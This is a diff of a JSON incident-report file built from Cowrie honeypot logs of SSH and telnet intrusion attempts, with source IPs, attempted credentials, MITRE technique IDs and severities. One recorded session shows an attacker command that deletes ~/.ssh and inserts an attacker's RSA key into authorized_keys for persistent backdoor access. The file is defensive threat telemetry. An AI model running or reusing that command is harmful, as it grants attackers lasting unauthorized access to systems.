-          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
-          "kexAlgs": [
-            "diffie-hellman-group1-sha1",
-            "diffie-hellman-group14-sha1",
-            "diffie-hellman-group14-sha256",
-            "diffie-hellman-group16-sha512",
-            "diffie-hellman-group18-sha512",
-            "diffie-hellman-group-exchange-sha1",
-            "diffie-hellman-group-exchange-sha256",
-            "ecdh-sha2-nistp256",
-            "ecdh-sha2-nistp384",
-            "ecdh-sha2-nistp521",
-            "curve25519-sha256",
-            "curve25519-sha256@libssh.org",
-            "ext-info-c"
-          ],
-          "keyAlgs": [
-            "ssh-ed25519",
-            "ssh-ed25519-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp256",
-            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp384",
-            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp521",
-            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
-            "ssh-rsa",
-            "ssh-rsa-cert-v01@openssh.com",
-            "ssh-dss",
-            "ssh-dss-cert-v01@openssh.com"
-          ],
-          "encCS": [
-            "des",
-            "3des",
-            "blowfish",
-            "none",
-            "3des-cbc",
-            "blowfish-cbc",
-            "cast128-cbc",
-            "arcfour",
-            "arcfour128",
-            "arcfour256",
-            "aes128-cbc",
-            "aes192-cbc",
-            "aes256-cbc",
-            "rijndael-cbc@lysator.liu.se",
-            "aes128-ctr",
-            "aes192-ctr",
-            "aes256-ctr",
-            "aes128-gcm@openssh.com",
-            "aes256-gcm@openssh.com",
-            "chacha20-poly1305@openssh.com"
-          ],
-          "macCS": [
-            "hmac-sha1",
-            "hmac-sha1-96",
-            "hmac-sha2-256",
-            "hmac-sha2-512",
-            "hmac-md5",
-            "hmac-md5-96",
-            "hmac-ripemd160",
-            "hmac-ripemd160@openssh.com",
-            "umac-64@openssh.com",
-            "umac-128@openssh.com",
-            "hmac-sha1-etm@openssh.com",
-            "hmac-sha1-96-etm@openssh.com",
-            "hmac-sha2-256-etm@openssh.com",
-            "hmac-sha2-512-etm@openssh.com",
-            "hmac-md5-etm@openssh.com",
-            "hmac-md5-96-etm@openssh.com",
-            "hmac-ripemd160-etm@openssh.com",
-            "umac-64-etm@openssh.com",
-            "umac-128-etm@openssh.com"
-          ],
-          "compCS": [
-            "none",
-            "zlib@openssh.com",
-            "zlib"
-          ],
-          "langCS": [
-            ""
-          ],
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:42:59.948052Z",
-          "src_ip": "222.236.155.146",
-          "protocol": "ssh",
-          "event": "cowrie.client.kex"
-        },
-        {
-          "eventid": "cowrie.login.failed",
-          "username": "blank",
-          "password": "123abc",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:43:02.006223Z",
-          "src_ip": "222.236.155.146",
-          "protocol": "ssh",
-          "event": "cowrie.login.failed"
-        },
-        {
-          "eventid": "cowrie.session.closed",
-          "duration": "4.5",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:43:03.673660Z",
-          "src_ip": "222.236.155.146",
-          "protocol": "ssh",
-          "event": "cowrie.session.closed"
-        }
-      ]
-    },
-    {
-      "case_id": "IR-7be1e73bdfd5",
-      "src_ip": "115.41.61.9",
-      "first_seen": "2026-04-02T06:43:02.228141Z",
-      "last_seen": "2026-04-02T06:43:15.227688Z",
-      "duration_seconds": 12,
-      "login_attempts": 0,
-      "login_success": false,
-      "commands": [],
-      "downloads": [],
-      "ttps": [],
-      "severity": "LOW",
-      "timeline": [
-        {
-          "eventid": "cowrie.session.connect",
-          "src_ip": "115.41.61.9",
-          "src_port": 39518,
-          "dst_ip": "172.31.34.72",
-          "dst_port": 2223,
-          "protocol": "telnet",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:43:02.228141Z",
-          "event": "cowrie.session.connect"
-        },
-        {
-          "eventid": "cowrie.session.closed",
-          "duration": 12.999656200408936,
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:43:15.227688Z",
-          "src_ip": "115.41.61.9",
-          "protocol": "telnet",
-          "event": "cowrie.session.closed"
-        }
-      ]
-    },
-    {
-      "case_id": "IR-16f993a97f41",
-      "src_ip": "113.158.205.225",
-      "first_seen": "2026-04-02T07:02:17.601219Z",
-      "last_seen": "2026-04-02T07:02:21.890175Z",
-      "duration_seconds": 4,
-      "login_attempts": 1,
-      "login_success": false,
-      "commands": [],
-      "downloads": [],
-      "ttps": [
-        "T1110.001",
-        "T1592"
-      ],
-      "severity": "LOW",
-      "timeline": [
-        {
-          "eventid": "cowrie.session.connect",
-          "src_ip": "113.158.205.225",
-          "src_port": 58796,
-          "dst_ip": "172.31.34.72",
-          "dst_port": 2222,
-          "protocol": "ssh",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T07:02:17.601219Z",
-          "event": "cowrie.session.connect"
-        },
-        {
-          "eventid": "cowrie.client.version",
-          "version": "SSH-2.0-OpenSSH_7.4",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T07:02:18.304213Z",
-          "src_ip": "113.158.205.225",
-          "protocol": "ssh",
-          "event": "cowrie.client.version"
-        },
-        {
-          "eventid": "cowrie.client.kex",
-          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
-          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
-          "kexAlgs": [
-            "diffie-hellman-group1-sha1",
-            "diffie-hellman-group14-sha1",
-            "diffie-hellman-group14-sha256",
-            "diffie-hellman-group16-sha512",
-            "diffie-hellman-group18-sha512",
-            "diffie-hellman-group-exchange-sha1",
-            "diffie-hellman-group-exchange-sha256",
-            "ecdh-sha2-nistp256",
-            "ecdh-sha2-nistp384",
-            "ecdh-sha2-nistp521",
-            "curve25519-sha256",
-            "curve25519-sha256@libssh.org",
-            "ext-info-c"
-          ],
-          "keyAlgs": [
-            "ssh-ed25519",
-            "ssh-ed25519-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp256",
-            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp384",
-            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp521",
-            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
-            "ssh-rsa",
-            "ssh-rsa-cert-v01@openssh.com",
-            "ssh-dss",
-            "ssh-dss-cert-v01@openssh.com"
-          ],
-          "encCS": [
-            "des",
-            "3des",
-            "blowfish",
-            "none",
-            "3des-cbc",
-            "blowfish-cbc",
-            "cast128-cbc",
-            "arcfour",
-            "arcfour128",
-            "arcfour256",
-            "aes128-cbc",
-            "aes192-cbc",
-            "aes256-cbc",
-            "rijndael-cbc@lysator.liu.se",
-            "aes128-ctr",
-            "aes192-ctr",
-            "aes256-ctr",
-            "aes128-gcm@openssh.com",
-            "aes256-gcm@openssh.com",
-            "chacha20-poly1305@openssh.com"
-          ],
-          "macCS": [
-            "hmac-sha1",
-            "hmac-sha1-96",
-            "hmac-sha2-256",
-            "hmac-sha2-512",
-            "hmac-md5",
-            "hmac-md5-96",
-            "hmac-ripemd160",
-            "hmac-ripemd160@openssh.com",
-            "umac-64@openssh.com",
-            "umac-128@openssh.com",
-            "hmac-sha1-etm@openssh.com",
-            "hmac-sha1-96-etm@openssh.com",
-            "hmac-sha2-256-etm@openssh.com",
-            "hmac-sha2-512-etm@openssh.com",
-            "hmac-md5-etm@openssh.com",
-            "hmac-md5-96-etm@openssh.com",
-            "hmac-ripemd160-etm@openssh.com",
-            "umac-64-etm@openssh.com",
-            "umac-128-etm@openssh.com"
-          ],
-          "compCS": [
-            "none",
-            "zlib@openssh.com",
-            "zlib"
-          ],
-          "langCS": [
-            ""
-          ],
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T07:02:18.304917Z",
-          "src_ip": "113.158.205.225",
-          "protocol": "ssh",
-          "event": "cowrie.client.kex"
-        },
-        {
-          "eventid": "cowrie.login.failed",
-          "username": "Nobody",
-          "password": "1234",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T07:02:20.234188Z",
-          "src_ip": "113.158.205.225",
-          "protocol": "ssh",
-          "event": "cowrie.login.failed"
-        },
-        {
-          "eventid": "cowrie.session.closed",
-          "duration": "4.3",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T07:02:21.890175Z",
-          "src_ip": "113.158.205.225",
-          "protocol": "ssh",
-          "event": "cowrie.session.closed"
-        }
-      ]
-    },
-    {
-      "case_id": "IR-b20137d022e9",
-      "src_ip": "103.219.154.156",
-      "first_seen": "2026-04-02T07:07:38.655996Z",
-      "last_seen": "2026-04-02T07:07:41.186447Z",
+      "case_id": "IR-b362d51b3c94",
+      "src_ip": "69.5.7.176",
+      "first_seen": "2026-04-02T07:38:24.157365Z",
+      "last_seen": "2026-04-02T07:38:26.181105Z",
       "duration_seconds": 2,
       "login_attempts": 1,
       "login_success": false,
@@ -1772,21 +441,243 @@
       "timeline": [
         {
           "eventid": "cowrie.session.connect",
-          "src_ip": "103.219.154.156",
-          "src_port": 45220,
+          "src_ip": "69.5.7.176",
+          "src_port": 40646,
           "dst_ip": "172.31.34.72",
           "dst_port": 2222,
           "protocol": "ssh",
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T07:07:38.655996Z",
+          "timestamp": "2026-04-02T07:38:24.157365Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-libssh_0.11.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:24.158076Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.client.kex",
+          "hassh": "03a80b21afa810682a776a7d42e5e6fb",
+          "hasshAlgorithms": "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512;none,zlib@openssh.com",
+          "kexAlgs": [
+            "curve25519-sha256",
+            "curve25519-sha256@libssh.org",
+            "ecdh-sha2-nistp256",
+            "ecdh-sha2-nistp384",
+            "ecdh-sha2-nistp521",
+            "diffie-hellman-group18-sha512",
+            "diffie-hellman-group16-sha512",
+            "diffie-hellman-group-exchange-sha256",
+            "diffie-hellman-group14-sha256",
+            "ext-info-c",
+            "kex-strict-c-v00@openssh.com"
+          ],
+          "keyAlgs": [
+            "ssh-ed25519",
+            "ecdsa-sha2-nistp521",
+            "ecdsa-sha2-nistp384",
+            "ecdsa-sha2-nistp256",
+            "sk-ssh-ed25519@openssh.com",
+            "sk-ecdsa-sha2-nistp256@openssh.com",
+            "rsa-sha2-512",
+            "rsa-sha2-256"
+          ],
+          "encCS": [
+            "chacha20-poly1305@openssh.com",
+            "aes256-gcm@openssh.com",
+            "aes128-gcm@openssh.com",
+            "aes256-ctr",
+            "aes192-ctr",
+            "aes128-ctr"
+          ],
+          "macCS": [
+            "hmac-sha2-256-etm@openssh.com",
+            "hmac-sha2-512-etm@openssh.com",
+            "hmac-sha2-256",
+            "hmac-sha2-512"
+          ],
+          "compCS": [
+            "none",
+            "zlib@openssh.com"
+          ],
+          "langCS": [
+            ""
+          ],
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:24.307588Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "eventid": "cowrie.login.failed",
+          "username": "345gs5662d34",
+          "password": "345gs5662d34",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:25.029193Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "2.0",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:26.181105Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-f67d6723db4a",
+      "src_ip": "69.5.7.176",
+      "first_seen": "2026-04-02T07:38:26.336567Z",
+      "last_seen": "2026-04-02T07:38:27.298893Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "69.5.7.176",
+          "src_port": 40662,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:26.336567Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-libssh_0.11.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:26.337209Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.client.kex",
+          "hassh": "03a80b21afa810682a776a7d42e5e6fb",
+          "hasshAlgorithms": "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512;none,zlib@openssh.com",
+          "kexAlgs": [
+            "curve25519-sha256",
+            "curve25519-sha256@libssh.org",
+            "ecdh-sha2-nistp256",
+            "ecdh-sha2-nistp384",
+            "ecdh-sha2-nistp521",
+            "diffie-hellman-group18-sha512",
+            "diffie-hellman-group16-sha512",
+            "diffie-hellman-group-exchange-sha256",
+            "diffie-hellman-group14-sha256",
+            "ext-info-c",
+            "kex-strict-c-v00@openssh.com"
+          ],
+          "keyAlgs": [
+            "ssh-ed25519",
+            "ecdsa-sha2-nistp521",
+            "ecdsa-sha2-nistp384",
+            "ecdsa-sha2-nistp256",
+            "sk-ssh-ed25519@openssh.com",
+            "sk-ecdsa-sha2-nistp256@openssh.com",
+            "rsa-sha2-512",
+            "rsa-sha2-256"
+          ],
+          "encCS": [
+            "chacha20-poly1305@openssh.com",
+            "aes256-gcm@openssh.com",
+            "aes128-gcm@openssh.com",
+            "aes256-ctr",
+            "aes192-ctr",
+            "aes128-ctr"
+          ],
+          "macCS": [
+            "hmac-sha2-256-etm@openssh.com",
+            "hmac-sha2-512-etm@openssh.com",
+            "hmac-sha2-256",
+            "hmac-sha2-512"
+          ],
+          "compCS": [
+            "none",
+            "zlib@openssh.com"
+          ],
+          "langCS": [
+            ""
+          ],
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:26.490642Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "eventid": "cowrie.login.success",
+          "username": "root",
+          "password": "3245gs5662d34",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:27.144547Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.login.success"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "1.0",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:38:27.298893Z",
+          "src_ip": "69.5.7.176",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-1a033fb66057",
+      "src_ip": "201.28.237.90",
+      "first_seen": "2026-04-02T07:39:27.123833Z",
+      "last_seen": "2026-04-02T07:39:32.371547Z",
+      "duration_seconds": 5,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "201.28.237.90",
+          "src_port": 45452,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:39:27.123833Z",
           "event": "cowrie.session.connect"
         },
         {
           "eventid": "cowrie.client.version",
           "version": "SSH-2.0-OpenSSH_7.4",
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T07:07:38.993245Z",
-          "src_ip": "103.219.154.156",
+          "timestamp": "2026-04-02T07:39:27.950630Z",
+          "src_ip": "201.28.237.90",
           "protocol": "ssh",
           "event": "cowrie.client.version"
         },
@@ -1875,37 +766,2069 @@
             ""
           ],
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T07:07:38.993963Z",
-          "src_ip": "103.219.154.156",
+          "timestamp": "2026-04-02T07:39:27.951387Z",
+          "src_ip": "201.28.237.90",
           "protocol": "ssh",
           "event": "cowrie.client.kex"
         },
         {
           "eventid": "cowrie.login.failed",
-          "username": "ubuntu",
-          "password": "dietpi",
+          "username": "Support",
+          "password": "0987654321",
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T07:07:39.866287Z",
-          "src_ip": "103.219.154.156",
+          "timestamp": "2026-04-02T07:39:30.481214Z",
+          "src_ip": "201.28.237.90",
           "protocol": "ssh",
           "event": "cowrie.login.failed"
         },
         {
           "eventid": "cowrie.session.closed",
-          "duration": "2.5",
+          "duration": "5.2",
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T07:07:41.186447Z",
-          "src_ip": "103.219.154.156",
+          "timestamp": "2026-04-02T07:39:32.371547Z",
+          "src_ip": "201.28.237.90",
           "protocol": "ssh",
           "event": "cowrie.session.closed"
         }
       ]
     },
     {
-      "case_id": "IR-baa69e04a10a",
-      "src_ip": "4.236.173.162",
-      "first_seen": "2026-04-02T07:08:36.312052Z",
-      "last_seen": "2026-04-02T07:08:36.312928Z",
+      "case_id": "IR-dc78bbae46df",
+      "src_ip": "112.221.175.214",
+      "first_seen": "2026-04-02T07:40:45.076761Z",
+      "last_seen": "2026-04-02T07:40:49.444287Z",
+      "duration_seconds": 4,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
+      ],
+      "downloads": [
+        {
+          "url": "",
+          "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2"
+        }
+      ],
+      "ttps": [
+        "T1021.004",
+        "T1078",
+        "T1105",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "112.221.175.214",
+          "src_port": 44336,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:45.076761Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-libssh_0.11.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:45.077403Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.client.kex",
+          "hassh": "03a80b21afa810682a776a7d42e5e6fb",
+          "hasshAlgorithms": "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512;none,zlib@openssh.com",
+          "kexAlgs": [
+            "curve25519-sha256",
+            "curve25519-sha256@libssh.org",
+            "ecdh-sha2-nistp256",
+            "ecdh-sha2-nistp384",
+            "ecdh-sha2-nistp521",
+            "diffie-hellman-group18-sha512",
+            "diffie-hellman-group16-sha512",
+            "diffie-hellman-group-exchange-sha256",
+            "diffie-hellman-group14-sha256",
+            "ext-info-c",
+            "kex-strict-c-v00@openssh.com"
+          ],
+          "keyAlgs": [
+            "ssh-ed25519",
+            "ecdsa-sha2-nistp521",
+            "ecdsa-sha2-nistp384",
+            "ecdsa-sha2-nistp256",
+            "sk-ssh-ed25519@openssh.com",
+            "sk-ecdsa-sha2-nistp256@openssh.com",
+            "rsa-sha2-512",
+            "rsa-sha2-256"
+          ],
+          "encCS": [
+            "chacha20-poly1305@openssh.com",
+            "aes256-gcm@openssh.com",
+            "aes128-gcm@openssh.com",
+            "aes256-ctr",
+            "aes192-ctr",
+            "aes128-ctr"
+          ],
+          "macCS": [
+            "hmac-sha2-256-etm@openssh.com",
+            "hmac-sha2-512-etm@openssh.com",
+            "hmac-sha2-256",
+            "hmac-sha2-512"
+          ],
+          "compCS": [
+            "none",
+            "zlib@openssh.com"
+          ],
+          "langCS": [
+            ""
+          ],
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:45.209228Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "eventid": "cowrie.login.success",
+          "username": "root",
+          "password": "lol12345",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:45.762488Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.login.success"
+        },
+        {
+          "eventid": "cowrie.session.params",
+          "arch": "linux-arm-lsb",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:46.087154Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.session.params"
+        },
+        {
+          "eventid": "cowrie.command.input",
+          "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:46.087693Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.command.input"
+        },
+        {
+          "eventid": "cowrie.command.failed",
+          "input": "lockr -ia .ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:46.088591Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.command.failed"
+        },
+        {
+          "eventid": "cowrie.log.closed",
+          "ttylog": "var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644",
+          "size": 32,
+          "shasum": "c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644",
+          "duplicate": true,
+          "duration": "0.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:46.219504Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "eventid": "cowrie.session.params",
+          "arch": "linux-arm-lsb",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:46.496387Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.session.params"
+        },
+        {
+          "eventid": "cowrie.command.input",
+          "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:46.496872Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.command.input"
+        },
+        {
+          "eventid": "cowrie.session.file_download",
+          "duplicate": true,
+          "outfile": "var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+          "shasum": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+          "destfile": "/root/.ssh/authorized_keys",
